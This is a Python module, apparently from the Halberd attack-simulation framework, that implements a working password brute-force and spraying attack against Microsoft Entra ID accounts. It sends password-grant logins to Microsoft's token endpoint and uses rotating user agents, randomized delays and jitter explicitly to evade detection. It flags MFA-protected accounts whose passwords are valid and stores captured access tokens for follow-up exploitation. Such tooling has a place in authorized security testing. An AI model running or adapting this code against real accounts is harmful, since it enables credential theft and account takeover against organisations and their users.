from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, TechniqueNote
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.entra.entra_token_manager import EntraTokenManager
import requests
import base64
import time
import random
from datetime import datetime

@TechniqueRegistry.register
class EntraBruteforcePassword(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1110.001",
                technique_name="Brute Force",
                tactics=["Credential Access", "Initial Access"],
                sub_technique_name="Password Guessing"
            ),
            MitreTechnique(
                technique_id="T1110.003",
                technique_name="Brute Force",
                tactics=["Credential Access", "Initial Access"],
                sub_technique_name="Password Spraying"
            )
        ]
        
        technique_notes = [
            TechniqueNote("Monitor for MFA prompts and conditional access policy triggers which may indicate valid credentials even when authentication fails."),
            TechniqueNote("Save successful tokens automatically to enable immediate follow-up attacks without re-authentication."),
            TechniqueNote("Use the 'stop_on_success' option for stealth operations where you want to minimize failed authentication logs."),
            TechniqueNote("Large password lists can take significant time - consider using smaller, targeted lists during time-constrained engagements."),
            TechniqueNote("Account lockout detection helps prevent service disruption and maintains operational security during testing.")
        ]
        
        super().__init__(
            "Brute Force Password", 
            "Executes password brute force attack against Entra ID user accounts by attempting authentication with multiple passwords. The technique implements throttling mechanisms with randomized delays to evade detections and avoid triggering account lockouts. It automatically detects successful authentications, MFA-protected accounts, and account lockout conditions. The technique provides detailed metrics including attempt counts, success rates, and timing information. Upon successful authentication, the technique can automatically save access tokens and integrate them into the Halberd token management system for immediate follow-up exploitation.",
            mitre_techniques,
            notes=technique_notes
        )

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        
        try:
            # Extract and validate required parameters
            username_file: str = kwargs.get('username_file', None)
            password_file: str = kwargs.get('password_file', None)
            client_id: str = kwargs.get('client_id', 'd3590ed6-52b3-4102-aeff-aad2292ab01c')
            min_wait: int = kwargs.get('min_wait', 5)
            max_wait: int = kwargs.get('max_wait', 15)
            max_attempts_per_user: int = kwargs.get('max_attempts_per_user', 50)
            stop_on_success: bool = kwargs.get('stop_on_success', False)
            randomize_order: bool = kwargs.get('randomize_order', True)
            save_tokens: bool = kwargs.get('save_tokens', True)
            set_as_active_token: bool = kwargs.get('set_as_active_token', False)
            enable_jitter: bool = kwargs.get('enable_jitter', True)
            lockout_threshold: int = kwargs.get('lockout_threshold', 5)

            # Input validation
            if not username_file or not password_file:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": "Both username file and password file are required"
                }

            # Set defaults for optional parameters
            if client_id in [None, ""]:
                client_id = 'd3590ed6-52b3-4102-aeff-aad2292ab01c'
            if min_wait in [None, ""] or min_wait < 1:
                min_wait = 5
            if max_wait in [None, ""] or max_wait < min_wait:
                max_wait = min_wait + 10
            if max_attempts_per_user in [None, ""] or max_attempts_per_user < 1:
                max_attempts_per_user = 50
            if lockout_threshold in [None, ""] or lockout_threshold < 1:
                lockout_threshold = 5

            if stop_on_success not in [True, False]:
                stop_on_success = False
            if randomize_order not in [True, False]:
                randomize_order = True
            if save_tokens not in [True, False]:
                save_tokens = True
            if set_as_active_token not in [True, False]:
                set_as_active_token = False
            if enable_jitter not in [True, False]:
                enable_jitter = True

            # Authentication endpoint and configuration
            endpoint_url = "https://login.microsoft.com/common/oauth2/token"
            resource = "https://graph.microsoft.com"
            scope = ['openid']
            
            # Prepare headers for rotation
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            ]
            
            # Parse username file
            try:
                username_content = username_file.split(',')[-1]
                username_decoded = base64.b64decode(username_content)
                username_text = username_decoded.decode('utf-8')
                user_list = [u.strip() for u in username_text.split('\n') if u.strip()]
                user_list = list(set(user_list))  # Remove duplicates
            except Exception as e:
                return ExecutionStatus.FAILURE, {
                    "error": str(e),
                    "message": "Failed to decode username file"
                }

            # Parse password file
            try:
                password_content = password_file.split(',')[-1]
                password_decoded = base64.b64decode(password_content)
                password_text = password_decoded.decode('utf-8')
                password_list = [p.strip() for p in password_text.split('\n') if p.strip()]
                
                # Randomize password order if requested
                if randomize_order:
                    random.shuffle(password_list)
                    
            except Exception as e:
                return ExecutionStatus.FAILURE, {
                    "error": str(e),
                    "message": "Failed to decode password file"
                }

            if not user_list or not password_list:
                return ExecutionStatus.FAILURE, {
                    "error": "Empty file content",
                    "message": "Username or password file is empty"
                }

            # Initialize tracking variables
            attack_results = {}
            successful_auths = []
            locked_accounts = []
            mfa_accounts = []
            total_attempts = 0
            start_time = datetime.now()
            
            # Execute brute force attack
            for username in user_list:
                if not username:
                    continue
                    
                user_attempts = 0
                consecutive_failures = 0
                account_locked = False
                
                attack_results[username] = {
                    "attempts": 0,
                    "status": "attempting",
                    "passwords_tried": [],
                    "error_codes": [],
                    "first_attempt": datetime.now().isoformat(),
                    "last_attempt": None
                }
                
                # Try passwords for current user
                for password in password_list:
                    if user_attempts >= max_attempts_per_user:
                        attack_results[username]["status"] = "max_attempts_reached"
                        break
                        
                    if account_locked:
                        attack_results[username]["status"] = "account_locked"
                        break
                    
                    try:
                        # Implement delay with jitter
                        if total_attempts > 0:
                            base_delay = random.uniform(min_wait, max_wait)
                            if enable_jitter:
                                jitter = random.uniform(-2, 2)
                                delay = max(1, base_delay + jitter)
                            else:
                                delay = base_delay
                            time.sleep(delay)
                        
                        # Rotate user agent
                        headers = {
                            "Accept": "application/json",
                            "Content-Type": "application/x-www-form-urlencoded",
                            "User-Agent": random.choice(user_agents)
                        }
                        
                        # Prepare authentication payload
                        auth_data = {
                            "grant_type": "password",
                            "password": password,
                            "client_id": client_id,
                            "username": username,
                            "resource": resource,
                            "scope": ' '.join(scope)
                        }
                        
                        user_attempts += 1
                        total_attempts += 1
                        attack_results[username]["attempts"] = user_attempts
                        attack_results[username]["passwords_tried"].append(password)
                        attack_results[username]["last_attempt"] = datetime.now().isoformat()
                        
                        # Execute authentication attempt
                        response = requests.post(
                            url=endpoint_url, 
                            headers=headers, 
                            data=auth_data,
                            timeout=30
                        )
                        
                        # Handle successful authentication
                        if 200 <= response.status_code < 300:
                            access_token = response.json().get('access_token')
                            
                            if save_tokens and access_token:
                                EntraTokenManager().add_token(access_token)
                                if set_as_active_token:
                                    EntraTokenManager().set_active_token(access_token)
                            
                            successful_auths.append({
                                "username": username,
                                "password": password,
                                "access_token": access_token,
                                "attempts_required": user_attempts,
                                "timestamp": datetime.now().isoformat()
                            })
                            
                            attack_results[username]["status"] = "success"
                            attack_results[username]["successful_password"] = password
                            attack_results[username]["access_token"] = bool(access_token)
                            
                            if stop_on_success:
                                end_time = datetime.now()
                                duration = (end_time - start_time).total_seconds()
                                
                                return ExecutionStatus.SUCCESS, {
                                    "message": f"Password found for {username}",
                                    "value": {
                                        "successful_authentications": successful_auths,
                                        "attack_summary": {
                                            "total_attempts": total_attempts,
                                            "duration_seconds": duration,
                                            "users_tested": len([u for u in attack_results.keys() if attack_results[u]["attempts"] > 0]),
                                            "success_rate": len(successful_auths) / len(user_list) * 100
                                        },
                                        "detailed_results": attack_results
                                    }
                                }
                            
                            consecutive_failures = 0
                            break  # Move to next user
                        
                        else:
                            # Handle authentication failures
                            error_response = response.json() if response.content else {}
                            error_codes = error_response.get('error_codes', [])
                            error_description = error_response.get('error_description', '')
                            
                            attack_results[username]["error_codes"].extend(error_codes)
                            consecutive_failures += 1
                            
                            # Check for MFA requirement (valid credentials but additional auth needed)
                            if any(code in [50076, 50072, 50074, 50005, 50131] for code in error_codes):
                                mfa_accounts.append({
                                    "username": username,
                                    "password": password,
                                    "error_codes": error_codes,
                                    "attempts_required": user_attempts
                                })
                                attack_results[username]["status"] = "mfa_required"
                                attack_results[username]["valid_password"] = password
                                break  # Valid creds found, move to next user
                            
                            # Check for account lockout indicators
                            elif any(code in [50053, 50057] for code in error_codes) or "locked" in error_description.lower():
                                locked_accounts.append(username)
                                account_locked = True
                                attack_results[username]["status"] = "account_locked"
                                
                            # Check for excessive consecutive failures (potential lockout risk)
                            elif consecutive_failures >= lockout_threshold:
                                attack_results[username]["status"] = "lockout_risk_detected"
                                break
                    
                    except requests.exceptions.RequestException as e:
                        attack_results[username]["error_codes"].append(f"Network error: {str(e)}")
                        time.sleep(min_wait * 2)  # Extended delay for network issues
                        continue
                    
                    except Exception as e:
                        attack_results[username]["error_codes"].append(f"Unexpected error: {str(e)}")
                        continue
                
                # Mark user as completed if not already marked with special status
                if attack_results[username]["status"] == "attempting":
                    attack_results[username]["status"] = "completed_no_match"

            # Calculate final statistics
            end_time = datetime.now()
            duration = (end_time - start_time).total_seconds()
            
            users_with_success = len(successful_auths) + len(mfa_accounts)
            success_rate = (users_with_success / len(user_list)) * 100 if user_list else 0
            
            # Determine overall execution status
            if successful_auths:
                execution_status = ExecutionStatus.SUCCESS
                message = f"Brute force completed with {len(successful_auths)} successful authentications"
            elif mfa_accounts:
                execution_status = ExecutionStatus.SUCCESS
                message = f"Brute force completed with {len(mfa_accounts)} valid credentials found (MFA required)"
            else:
                execution_status = ExecutionStatus.SUCCESS
                message = "Brute force completed with no successful authentications"
            
            return execution_status, {
                "message": message,
                "value": {
                    "successful_authentications": successful_auths,
                    "mfa_protected_accounts": mfa_accounts,
                    "locked_accounts": locked_accounts,
                    "attack_summary": {
                        "total_attempts": total_attempts,
                        "duration_seconds": duration,
                        "users_tested": len(user_list),
                        "passwords_tested": len(password_list),
                        "success_rate": success_rate,
                        "successful_users": len(successful_auths),
                        "mfa_users": len(mfa_accounts),
                        "locked_users": len(locked_accounts),
                        "start_time": start_time.isoformat(),
                        "end_time": end_time.isoformat()
                    },
                    "detailed_results": attack_results,
                    "configuration": {
                        "client_id": client_id,
                        "min_wait": min_wait,
                        "max_wait": max_wait,
                        "max_attempts_per_user": max_attempts_per_user,
                        "randomize_order": randomize_order,
                        "enable_jitter": enable_jitter,
                        "lockout_threshold": lockout_threshold
                    }
                }
            }
            
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to execute brute force attack"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "username_file": {
                "type": "str", 
                "required": True, 
                "default": None, 
                "name": "Username List File", 
                "input_field_type": "upload",
                "description": "Text file containing usernames (one per line) to target for brute force attack"
            },
            "password_file": {
                "type": "str", 
                "required": True, 
                "default": None, 
                "name": "Password List File", 
                "input_field_type": "upload",
                "description": "Text file containing passwords (one per line) to attempt against each username"
            },
            "client_id": {
                "type": "str", 
                "required": False, 
                "default": "d3590ed6-52b3-4102-aeff-aad2292ab01c", 
                "name": "MS Graph Client ID", 
                "input_field_type": "text",
                "description": "Microsoft Graph API client ID to use for authentication attempts"
            },
            "min_wait": {
                "type": "int", 
                "required": False, 
                "default": 5, 
                "name": "Minimum Wait (seconds)", 
                "input_field_type": "number",
                "description": "Minimum delay between authentication attempts to avoid detection"
            },
            "max_wait": {
                "type": "int", 
                "required": False, 
                "default": 15, 
                "name": "Maximum Wait (seconds)", 
                "input_field_type": "number",
                "description": "Maximum delay between authentication attempts for randomized timing"
            },
            "max_attempts_per_user": {
                "type": "int", 
                "required": False, 
                "default": 50, 
                "name": "Max Attempts Per User", 
                "input_field_type": "number",
                "description": "Maximum password attempts per username before moving to next user"
            },
            "stop_on_success": {
                "type": "bool", 
                "required": False, 
                "default": False, 
                "name": "Stop on First Success", 
                "input_field_type": "bool",
                "description": "Stop the entire attack when first successful authentication is found"
            },
            "randomize_order": {
                "type": "bool", 
                "required": False, 
                "default": True, 
                "name": "Randomize Password Order", 
                "input_field_type": "bool",
                "description": "Randomize the order of password attempts to avoid predictable patterns"
            },
            "save_tokens": {
                "type": "bool", 
                "required": False, 
                "default": True, 
                "name": "Save Access Tokens", 
                "input_field_type": "bool",
                "description": "Automatically save successful access tokens to Halberd token manager"
            },
            "set_as_active_token": {
                "type": "bool", 
                "required": False, 
                "default": False, 
                "name": "Set as Active Token", 
                "input_field_type": "bool",
                "description": "Set the first successful token as the active token in Halberd"
            },
            "enable_jitter": {
                "type": "bool", 
                "required": False, 
                "default": True, 
                "name": "Enable Timing Jitter", 
                "input_field_type": "bool",
                "description": "Add random timing variations to make detection more difficult"
            },
            "lockout_threshold": {
                "type": "int", 
                "required": False, 
                "default": 5, 
                "name": "Lockout Detection Threshold", 
                "input_field_type": "number",
                "description": "Number of consecutive failures before assuming account lockout risk"
            }
        }